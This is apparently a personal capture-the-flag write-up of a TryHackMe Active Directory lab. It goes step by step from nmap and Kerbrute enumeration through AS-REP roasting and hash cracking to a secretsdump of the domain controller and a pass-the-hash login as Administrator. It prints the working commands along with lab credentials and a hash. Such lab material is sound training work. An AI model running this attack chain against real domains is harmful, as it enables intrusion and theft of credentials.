# Active Directory
The three main tools to use for enumeration/exploitation of Active Directory is
- impacket
- Bloodhound
- Neo4j
- enum4linux

<a href="https://book.hacktricks.xyz/windows/active-directory-methodology">This</a> methodology si what I usually follow. For more information on Kerberos, check <a href="https://book.hacktricks.xyz/windows/active-directory-methodology/kerberos-authentication">this</a> out.

## Enumeration
The very first thing when performing enumeration is to perform an Nmap scan. While Nmap is an impressive tool, it cannot detect everything. Therefore after an initial nmap scan we'll be using other utilities to help us enumerate the services running on the device. 
```bash
# Nmap 7.92 scan initiated Mon Feb 21 20:41:05 2022 as: nmap -sC -sV -oN nmap/active.nmap -Pn 10.10.61.242
Nmap scan report for 10.10.61.242
Host is up (0.090s latency).
Not shown: 987 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
|_http-server-header: Microsoft-IIS/10.0
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-02-22 01:44:00Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=AttacktiveDirectory.spookysec.local
| Not valid before: 2022-02-21T01:32:31
|_Not valid after:  2022-08-23T01:32:31
|_ssl-date: 2022-02-22T01:44:15+00:00; +1s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: THM-AD
|   NetBIOS_Domain_Name: THM-AD
|   NetBIOS_Computer_Name: ATTACKTIVEDIREC
|   DNS_Domain_Name: spookysec.local
|   DNS_Computer_Name: AttacktiveDirectory.spookysec.local
|   Product_Version: 10.0.17763
|_  System_Time: 2022-02-22T01:44:06+00:00
Service Info: Host: ATTACKTIVEDIREC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2022-02-22T01:44:08
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Feb 21 20:44:18 2022 -- 1 IP address (1 host up) scanned in 192.97 seconds

```

### Enumerate 139/445
First, enumerate 139 and 445 using enum4linux. I run enum4linux with empty credentials and as guest:
```bash
enum4linux -a 10.10.61.242 && enum4linux -a -u "guest" -p "" 10.10.61.242
```
You will also want to run smbmap with the same credentials.
```bash
smbmap -u "" -p "" -P 445 -H 10.10.61.242 && smbmap -u "guest" -p "" -P 445 -H 10.10.61.242
```

### Enumerate Users via Kerberos
Kerberros is a key authentication service within Active Directory. The main tool to enumerate users and passwords is Kerbrute. It is NOT recommended to brute force credentials due to account lockout policies. The basic syntax for Kerbrute is:
```bash
./kerbrute_linux_amd64 userenum --dc 10.10.231.233 -d spookysec.local users.txt
```
This gives us a bunch of usernames. I nice feature of this process is that it does not lock any of the user accounts. Next we'll see if we can pull any password hashes.
```bash
2022/02/21 21:48:20 >  [+] VALID USERNAME:       james@spookysec.local
2022/02/21 21:48:21 >  [+] VALID USERNAME:       svc-admin@spookysec.local
2022/02/21 21:48:23 >  [+] VALID USERNAME:       James@spookysec.local
2022/02/21 21:48:24 >  [+] VALID USERNAME:       robin@spookysec.local
2022/02/21 21:48:32 >  [+] VALID USERNAME:       darkstar@spookysec.local
2022/02/21 21:48:36 >  [+] VALID USERNAME:       administrator@spookysec.local
2022/02/21 21:48:46 >  [+] VALID USERNAME:       backup@spookysec.local
2022/02/21 21:48:50 >  [+] VALID USERNAME:       paradox@spookysec.local
2022/02/21 21:49:20 >  [+] VALID USERNAME:       JAMES@spookysec.local
2022/02/21 21:49:29 >  [+] VALID USERNAME:       Robin@spookysec.local
2022/02/21 21:50:27 >  [+] VALID USERNAME:       Administrator@spookysec.local
2022/02/21 21:52:24 >  [+] VALID USERNAME:       Darkstar@spookysec.local
2022/02/21 21:53:08 >  [+] VALID USERNAME:       Paradox@spookysec.local
2022/02/21 21:55:32 >  [+] VALID USERNAME:       DARKSTAR@spookysec.local
2022/02/21 21:56:12 >  [+] VALID USERNAME:       ori@spookysec.local
2022/02/21 21:57:28 >  [+] VALID USERNAME:       ROBIN@spookysec.local
```

## Exploitation
Once user enumeration has finished, we can attempt to abuse a feature within Kerberos with an attack method called ASREPRoasting. ASREPRoasting occurs when a user account has the privilege "Does not require Pre-Authentication" set. This means that the account <b>does not</b> need to provide valide identification before requesting a Kerberos Ticket on the specified user account.<br><br>
Impacket has a tool called <b>GetNPUsers.py</b> that will allow us to query ASREProastable accounts from the Key Distribution Center. The only thing that's necessary to query accounts is a valid set of usernames whcih we enumerated previously via Kerbrute.
```bash
./GetNPUsers.py -no-pass -dc-ip 10.10.231.233 spookysec.local/svc-admin (FOR INDIVIDUAL REQUESTS)
OR 
./GetNPUsers.py -no-pass -dc-ip 10.10.231.233 spookysec.local/ -usersfile /home/kali/Documents/CTF/LearningPlatforms/tryhackme/active_directory/kerbrute/users.txt (FOR WORDLISTS)
```
Once we get the hash, all that's left to do is crack it:
```bash
john svc-admin_password.txt --wordlist=/usr/share/wordlists/rockyou.txt

management2005   ($krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL)
```

## Back to the Basics
With a user's account credentials we now have significantly more access within the domain. We can now attempt to enumerate shares that the domain controller may be giving out. I'll be running pretty much the same enumeration tools as before just with svc-admin:management2005 as the credentials. To login
```bash
smbmap -u "svc-admin" -p "management2005" -P 445 -H 10.10.252.24

[+] IP: 10.10.252.24:445        Name: 10.10.252.24                                      
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        backup                                                  READ ONLY
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share 
        SYSVOL                                                  READ ONLY       Logon server share
```
We can login to "backup" and gain more credentials.
```bash
smbclient \\\\10.10.252.24\\backup -U "svc-admin"

smb: \> ls  
  .                                   D        0  Sat Apr  4 15:08:39 2020
  ..                                  D        0  Sat Apr  4 15:08:39 2020
  backup_credentials.txt              A       48  Sat Apr  4 15:08:53 2020
```
Viewing backup_credentials.txt gives you "YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw" which is a base64 encoding of "backup@spookysec.local:backup2517860"

## Elevating Privileges within the Domain
Now that we have a new user account, we may have more credentials than before. We can pivot over to "backup". Because this account is called "backup" it may be the backup account for the Domain Controller. Thios account has unique permissions that allows all Active Directory changes to be synced with this user account. This includes password hashes.<br><br>
Knowing this, we can use another tool within Impacket called "secretsdump.py". This will allow us to retrieve all of the password hashes that this user account (that is synced with the domain controller) has to offer. Exploiting this, we will effectively have full control over the AD Domain.
```bash
impacket-secretsdump -just-dc spookysec.local/backup:backup2517860@10.10.252.24 > user_passwords_dump.txt
```
Using a tool called evil-winrm we can log into each user with just the hash. This attack is called "Pass the Hash". Read more abou it <a href="https://book.hacktricks.xyz/windows/active-directory-methodology#pass-the-hash">here</a>.
```bash
evil-winrm -u Administrator -H 0e0363213e37b94221497260b0bcb4fc -i 10.10.252.24
```